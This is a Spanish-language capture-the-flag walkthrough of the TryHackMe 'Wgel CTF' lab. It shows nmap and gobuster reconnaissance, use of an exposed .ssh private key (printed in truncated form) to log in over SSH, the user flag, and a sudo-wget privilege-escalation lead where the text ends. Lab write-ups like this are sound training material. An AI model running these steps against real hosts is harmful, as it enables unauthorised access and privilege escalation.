## TryHackMe  <> Wgel CTF
![image](https://github.com/Esevka/CTF/assets/139042999/5e26ad71-c251-438b-ba43-7eed13496eaf)

Enunciado Informacion : Obtener user.txt y root.txt

---
---

## Escaneo de puertos

Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido, por proximidad al valor 64 podriamos decir que es una maquina Linux.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/nmap]
    └─# ping -c1 10.10.111.201
    PING 10.10.111.201 (10.10.111.201) 56(84) bytes of data.
    64 bytes from 10.10.111.201: icmp_seq=1 ttl=63 time=51.6 ms
    
    --- 10.10.111.201 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 51.629/51.629/51.629/0.000 ms

Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.111.201 -oN open_ports
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-02 09:47 CEST
    Initiating SYN Stealth Scan at 09:47
     [...]
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack ttl 63
    80/tcp open  http    syn-ack ttl 63


    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/nmap]
    └─# nmap -p 22,80 -sCV 10.10.111.201 -vvv -oN info_ports                        
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-02 09:50 CEST
    NSE: Loaded 155 scripts for scanning.
    NSE: Script Pre-scanning.
    [...]
    
    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 94961b66801b7648682d14b59a01aaaa (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
    |   256 18f710cc5f40f6cf92f86916e248f438 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
    |   256 b90b972e459bf32a4b11c7831033e0ce (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
    
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


## Analisis de vulnerabilidaddes en los servicios y explotacion de los mismos.

Segun el launchpad del servicio OpenSSH 7.2p2 que esta corriento en el puerto 22 y el ttl obtenido anteriormente pordriamos decir que estamos delante de una maquina Linux.

![image](https://github.com/Esevka/CTF/assets/139042999/a445ff83-cfc4-46a8-bf4e-c9a636548566)

--Puerto 80

Cargamos la web y encontramos la pagina por defecto de Apache2 nada interesante, revisamos como siempro el codigo de la web por si acaso y encontramos lo siguiente.

![image](https://github.com/Esevka/CTF/assets/139042999/df66790e-53e7-4ecc-b807-bb7a84538ac2)

---
POSIBLE USUARIO ---> jessie
---

No vemos nada mas por lo que vamos a fuzzear la web en busca de directorios.

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/Wgel_CTF]
    └─# gobuster dir -u http://10.10.111.201 -w /usr/share/wordlists/dirb/common.txt -o fuzz
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    [...]
    ===============================================================
    /.htaccess            (Status: 403) [Size: 278]
    /.hta                 (Status: 403) [Size: 278]
    /.htpasswd            (Status: 403) [Size: 278]
    /index.html           (Status: 200) [Size: 11374]
    /server-status        (Status: 403) [Size: 278]
    /sitemap              (Status: 301) [Size: 316] [--> http://10.10.111.201/sitemap/]
    
Revisamos la url encontrada pero no encontramos nada interesante que nos pueda ayudar por lo que fuzzeamos el directorio anterior en busqueda de subdirectorios

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/Wgel_CTF]
    └─# gobuster dir -u http://10.10.111.201/sitemap -w /usr/share/wordlists/dirb/common.txt -o fuzz1
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    [...]
    ===============================================================
    /.htaccess            (Status: 403) [Size: 278]
    /.hta                 (Status: 403) [Size: 278]
    /.htpasswd            (Status: 403) [Size: 278]
    /.ssh                 (Status: 301) [Size: 321] [--> http://10.10.111.201/sitemap/.ssh/]
    /css                  (Status: 301) [Size: 320] [--> http://10.10.111.201/sitemap/css/]
    /fonts                (Status: 301) [Size: 322] [--> http://10.10.111.201/sitemap/fonts/]
    /images               (Status: 301) [Size: 323] [--> http://10.10.111.201/sitemap/images/]
    /index.html           (Status: 200) [Size: 21080]
    /js                   (Status: 301) [Size: 319] [--> http://10.10.111.201/sitemap/js/]
    Progress: 4579 / 4615 (99.22%)
    ===============================================================
    2023/08/02 10:10:40 Finished
    ===============================================================

Super real, un directorio /.ssh, posiblemente como en otros casos contenga una clave privada.

![image](https://github.com/Esevka/CTF/assets/139042999/880ee7d4-567b-4ecb-bc29-a3b7d693f241)

![image](https://github.com/Esevka/CTF/assets/139042999/ed1c5a82-9a9d-4862-a422-1f37b8d70f49)


Seguramente esta clave privada sea del usuario jessie encontrado anteriormente, vamos a conectarnor con esta clave por el servicio ssh del puerto 22.

Creamos un fichero llamado id_rsa con el contenido de la llave privada encontrada y le damos permiso solo de lectura.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/content]
    └─# echo '-----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
    m+JYAquy30lSp5jH/bhcvYLsK+T9zE
    [...]
    -----END RSA PRIVATE KEY-----' > id_rsa
    
    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/content]
    └─# chmod 400 id_rsa 

Nos conectamos al servicio ssh y obtenemos acceso a la maquina.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/content]
    └─# ssh jessie@10.10.111.201 -i id_rsa 
    The authenticity of host '10.10.111.201 (10.10.111.201)' can't be established.
    ED25519 key fingerprint is SHA256:6fAPL8SGCIuyS5qsSf25mG+DUJBUYp4syoBloBpgHfc.
    This host key is known by the following other names/addresses:
        ~/.ssh/known_hosts:28: [hashed name]
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.10.111.201' (ED25519) to the list of known hosts.
    Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
    8 packages can be updated.
    8 updates are security updates.
    
    jessie@CorpOne:~$ whoami;id
    jessie
    uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)


## Post Explotacion Obtencion de flags y Escalada de privilegios jessie to root.

Ya que tenemos acceso a la maquina verificamos sistema y version y efectivamente es lo que suponiamos.
      
    jessie@CorpOne:~$ lsb_release -a
    No LSB modules are available.
    Distributor ID: Ubuntu
    Description:    Ubuntu 16.04.6 LTS
    Release:        16.04
    Codename:       xenial

Buscamos la flag de usuario

    jessie@CorpOne:~$ find / -name '*user*flag*' 2>/dev/null
        /home/jessie/Documents/user_flag.txt

    jessie@CorpOne:~$ cat /home/jessie/Documents/user_flag.txt 
        057c67131c3d5e4...cd3075b198ff6

--Elevamos Privilegios

Listamos los comandos que nos estan permitidos ejecutar como root en la maquina victima.
    
        jessie@CorpOne:~$ sudo -l
        Matching Defaults entries for jessie on CorpOne:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
        
        User jessie may run the following commands on CorpOne:
            (ALL : ALL) ALL
            (root) NOPASSWD: /usr/bin/wget

Encontramos un articulo donde podemos abusar del comando wget para escalar privilegios ---> https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/





